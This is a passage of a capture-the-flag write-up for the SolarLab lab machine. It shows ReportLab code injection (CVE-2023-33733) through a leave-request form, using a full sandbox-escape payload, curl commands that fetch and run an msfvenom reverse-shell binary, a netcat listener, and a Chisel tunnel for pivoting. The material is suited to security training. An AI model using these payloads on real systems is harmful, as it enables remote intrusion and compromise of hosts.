data, uploaded a signature image found on Google, and clicked “Generate PDF”.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78049beb3e9fb71741681" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd9ace42b-1b6d-463c-b025-7371a770bd1f%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8049-beb3-e9fb71741681"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd9ace42b-1b6d-463c-b025-7371a770bd1f%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8049-beb3-e9fb71741681" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f7801caaefdc62a88f0441" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780c09facfa51fb7059af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The resulting PDF is pretty standard, with nothing particularly noteworthy to highlight.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780a3be94e99c3a5737b8" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7342758b-4e46-4803-a2e6-8f97b3735028%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-80a3-be94-e99c3a5737b8"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7342758b-4e46-4803-a2e6-8f97b3735028%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-80a3-be94-e99c3a5737b8" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f7808cbb27e02a8f590009" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7801aada7f0245e4443f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, inspecting the raw response in Burp would reveal that the PDF is generated using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.reportlab.com/">ReportLab</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780d29dd3c2651360cb45" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sun, 12 May 2024 10:32:17 GMT
Content-Type: application/pdf
Content-Length: 208295
Connection: close
Cache-Control: no-cache
Content-Disposition: inline; filename=output.pdf
Vary: Cookie

%PDF-1.4
% ReportLab Generated PDF document http://www.reportlab.com
1 0 obj
&lt;&lt;
/F1 2 0 R /F2 5 0 R /F3 6 0 R
&gt;&gt;
..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7801bb3b2c55ea2a89e73" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7801bb239f965c45756f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This library is also found to be vulnerable to a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://socradar.io/cve-2023-33733-vulnerability-in-reportlab-allows-bypassing-sandbox-restrictions/">code injection bug</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7801aaea4da2b0e5261ad" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa2b75020-4e9c-4d87-8cea-1ad8bf583bc6%2Fimage.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-801a-aea4-da2b0e5261ad"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa2b75020-4e9c-4d87-8cea-1ad8bf583bc6%2Fimage.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-801a-aea4-da2b0e5261ad" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f78027bbc2f613613ddaff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f78082904ef2f7e686d7f5" class="Divider"></div><h3 id="https://www.notion.so/1700b98a88f780679607ee1cf83ca88e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1700b98a88f780679607ee1cf83ca88e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/1700b98a88f78066a4d8f9c54e78993b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Python ReportLab Code Injection RCE (CVE-2023-33733):</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f7806a88cedde41472ac7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/c53elyas/CVE-2023-33733">This GitHub repository</a></span><span class="SemanticString"> has a detailed writeup on the vulnerability. In short, some sandbox restrictions can be bypassed, enabling an attacker to create a custom class and then reference some Python built-in functions for RCE. The repository also contains a POC in HTML, and I’ve adapted it slightly to send back an HTTP request when triggered:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f78022bc8ceedb4b2bd5b0" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[[[getattr(pow, Word('__globals__'))['os'].system('curl http://10.10.14.74:8000/rce') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                exploit
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7802d814adab8acff0101" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7801b8c89dadd7679c411" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll submit a new leave request, pasting the payload in the “Justification” textbox. However, there’s a character limit implemented, and the second half of the payload got cut off.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780e1ae08f79b6435e18c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3b41dc8b-4216-485f-ac98-2d182d981b21%2FUntitled.png?width=679.96875&amp;table=block&amp;id=1700b98a-88f7-80e1-ae08-f79b6435e18c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3b41dc8b-4216-485f-ac98-2d182d981b21%2FUntitled.png?width=679.96875&amp;table=block&amp;id=1700b98a-88f7-80e1-ae08-f79b6435e18c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f78005820cdbdd0ee88523" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll submit it anyway, intercepting the request in Burp and pasting the full payload back in, but the application still returned with an error.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7806990b0c1e5c3079b35" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa8a20965-7c4e-4389-9b67-e1edbeb3a941%2FUntitled.png?width=499&amp;table=block&amp;id=1700b98a-88f7-8069-90b0-c1e5c3079b35"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa8a20965-7c4e-4389-9b67-e1edbeb3a941%2FUntitled.png?width=499&amp;table=block&amp;id=1700b98a-88f7-8069-90b0-c1e5c3079b35" style="width:499px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780af9b55fa87d78388d2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780ccbe10e1612e7eb630" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like the character limit is rather robust, but it’s possible that this restriction is not enforced on other fields. In Burp, I’ll replace the phone number with the payload:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780b8a7caefd02355ce15" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /leaveRequest HTTP/1.1
Host: report.solarlab.htb:6791
Content-Length: 550
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://report.solarlab.htb:6791
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBVYQPBOXtAh0Tv35
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://report.solarlab.htb:6791/leaveRequest
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwlzrkNwzAMAMBdVKew-JiUlzEoPnBaO66C7J4AuQnu3fY68zra9jrvfLT9GW1rET1ZSdZleIk6cnQwSAYiGuSp04xg1VqYXSnJUV08TREkgGJFTurTtNJRyFXdoRLInGcMzFpsdJzpFGgyHFjQphWOntR-kfvK87_p7fMF404wNA.ZkCtpw.r5m2PA7WqEbKaS1FgpV_x5asDSU
Connection: close

------WebKitFormBoundaryBVYQPBOXtAh0Tv35
Content-Disposition: form-data; name=&quot;time_interval&quot;

2024-05-12 to 2024-05-14
------WebKitFormBoundaryBVYQPBOXtAh0Tv35
Content-Disposition: form-data; name=&quot;leave_request&quot;

&lt;para&gt;&lt;font color=&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://10.10.14.74:8000/rce&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), { &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: { setattr(self, &#x27;mutated&#x27;, self.mutated - 1) }, &#x27;__hash__&#x27;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;&gt;
                exploit
&lt;/font&gt;&lt;/para&gt;
------WebKitFormBoundaryBVYQPBOXtAh0Tv35
Content-Disposition: form-data; name=&quot;signature&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream


------WebKitFormBoundaryBVYQPBOXtAh0Tv35
Content-Disposition: form-data; name=&quot;user_input&quot;

&lt;p&gt;dummy justification&lt;/p&gt;
------WebKitFormBoundaryBVYQPBOXtAh0Tv35--
</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f78023a1b2e3773781e00a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780678e05ee66ce05adff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">While this resulted in the application returning a 500 error, a GET request was detected on my HTTP server, indicating that code execution was successful.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f78060b69ee16891e3e629" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.213.44 - - [12/May/2024 21:33:22] code 404, message File not found
10.129.213.44 - - [12/May/2024 21:33:22] &quot;GET /rce HTTP/1.1&quot; 404 -</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f78035a7a3cc2229d6b3ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780ff9481c4faba3e826b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To achieve full RCE, I’ll take a multi-step approach. First, I’ll generate a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.exe</code></span><span class="SemanticString"> payload with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">msfvenon</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780c9beb9fa07dae2ee94" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.74 LPORT=8001 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7801889b3ff0819908a0c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780af8e49e09a3f2320ad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll send another payload that downloads the binary onto the current directory of the server:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780da8dffdde89b6d437f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&lt;para&gt;&lt;font color=&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://10.10.14.74:8000/shell.exe -O shell.exe&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), { &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: { setattr(self, &#x27;mutated&#x27;, self.mutated - 1) }, &#x27;__hash__&#x27;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;&gt;
                exploit
&lt;/font&gt;&lt;/para&gt;</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7803284b9ceded0f211d6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7804dae76ecfea55cf7c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The final payload was to trigger the binary:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780299743f7304d173933" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&lt;para&gt;&lt;font color=&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;.\\shell.exe&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), { &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: { setattr(self, &#x27;mutated&#x27;, self.mutated - 1) }, &#x27;__hash__&#x27;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;&gt;
                exploit
&lt;/font&gt;&lt;/para&gt;</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780cd9ae2fab410ad32b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f78063989edf17e08cf988" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And a shell session was captured on my </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netcat</code></span><span class="SemanticString"> listener. Foothold gained as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">blake</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780998295e1d102abdc3e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.213.44] 62492
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\blake\Documents\app&gt;</span></mark></span><span class="SemanticString"><span> whoami

solarlab\blake</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780539497f09c40ed41c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7806aa4aec594d1d9ded7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1700b98a88f780a3862fe54df4504ed1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\blake\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt

1c0cae89************************</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780f9a584c87d795dbf13" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780e8824acc8d6aea91bf" class="Divider"></div><h3 id="https://www.notion.so/1700b98a88f7806fa2d8ce768fec1315" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1700b98a88f7806fa2d8ce768fec1315"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">solarlab\blake</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1700b98a88f780299bece2636e330e7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Local Users:</strong></span></span></p></div><pre id="https://www.notion.so/1700b98a88f78015bc7dd6c7b6eb7dbd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\blake\Desktop&gt;</span></mark></span><span class="SemanticString"><span> net user

User accounts for \\SOLARLAB

-------------------------------------------------------------------------------
Administrator            blake                    DefaultAccount           
Guest                    openfire                 WDAGUtilityAccount       
The command completed successfully.</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f78044b3e3cfc2f7171592" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">While looking around, I noticed there’s a user called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">openfire</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780aea4fff338b976a3d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1700b98a88f780daaac4db7fe703e7d7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Program Files (x86)&gt;</span></mark></span><span class="SemanticString"><span> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4768
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1088
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6791           0.0.0.0:0              LISTENING       4768
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1332
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       660
  TCP    10.129.213.44:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.213.44:62492    10.10.14.74:8001       ESTABLISHED     4248
  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING       1956
  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       3128
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3128
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3128</span></mark></span><span class="SemanticString"><span>
  TCP    127.0.0.1:57693        127.0.0.1:57694        ESTABLISHED     3128
  TCP    127.0.0.1:57694        127.0.0.1:57693        ESTABLISHED     3128
  TCP    127.0.0.1:57695        127.0.0.1:57696        ESTABLISHED     3128
  TCP    127.0.0.1:57696        127.0.0.1:57695        ESTABLISHED     3128
  TCP    127.0.0.1:57697        127.0.0.1:57698        ESTABLISHED     3128
  ..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780d9a5adc362ea3a1c84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given ports 9090 and 9091 were also found to be open, it’s likely that the server has OpenFire installed. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/igniterealtime/Openfire">OpenFire</a></span><span class="SemanticString"> is an open-source real-time collaboration (RTC) server commonly used for internal communication within organizations. It includes some monitoring and administrative features, as such the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">openfire</code></span><span class="SemanticString"> user often comes with elevated privileges.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780049560e1d99834adc1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780a5a237e689d083ab4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Local Port 9090 — OpenFire:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f78038a943c82846aa71ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web-based admin panel is typically hosted on the two ports mentioned above. I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/jpillora/chisel">Chisel</a></span><span class="SemanticString"> to set up a tunnel between the server and my host.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7808aabb5feecf61c9848" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> ./chisel server -p 5000 --reverse

2024/05/12 22:35:53 server: Reverse tunnelling enabled
2024/05/12 22:35:53 server: Fingerprint 4JVBoMAvON/6byN2YSV1RwTOVaN2YRV5Zssn7QVf1xI=
2024/05/12 22:35:53 server: Listening on http://0.0.0.0:5000
2024/05/12 22:44:58 server: session#1: tun: proxy#R:9090=&gt;9090: Listening</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780a5823ef334e0710cad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1700b98a88f780ff9573e60b3aba710c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\blake\Documents\app&gt;</span></mark></span><span class="SemanticString"><span> .\chisel.exe client 10.10.14.74:5000 R:9090:127.0.0.1:9090

2024/05/12 16:14:56 client: Connecting to ws://10.10.14.74:5000
